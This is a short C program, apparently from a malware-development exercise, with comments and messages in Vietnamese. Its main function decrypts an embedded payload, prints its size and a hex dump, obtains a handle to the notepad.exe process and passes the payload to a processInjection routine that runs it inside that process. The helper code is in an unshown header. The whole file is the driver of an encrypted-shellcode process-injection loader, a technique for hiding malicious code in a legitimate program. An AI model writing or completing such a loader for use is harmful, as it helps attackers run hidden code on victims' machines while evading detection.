#include <stdio.h>
#include <Windows.h>
#include <string.h>
#include <winternl.h>
#include "injection.h"



int main(){

    


    unsigned char decrypted[1024];
    size_t paySize = decryptPay(decrypted);

    printf("paySize = %zu\n", paySize);
    printf("Dia chi decrypted la : 0x%p \n", decrypted);
    PrintHexData("decrypted", decrypted, paySize);

    CHAR szProcessName[] = "notepad.exe";
    DWORD remoteProcPID = 0;
    HANDLE remoteProcHand = NULL;

    if(!getRemoteProcHandle(szProcessName, &remoteProcPID, &remoteProcHand)){

        printf("Tim Kiem co van de hoac khong tim thay process \n");
        return -1;

    };

    processInjection(decrypted, paySize, remoteProcHand);

    


    return 0;
    


    

    


}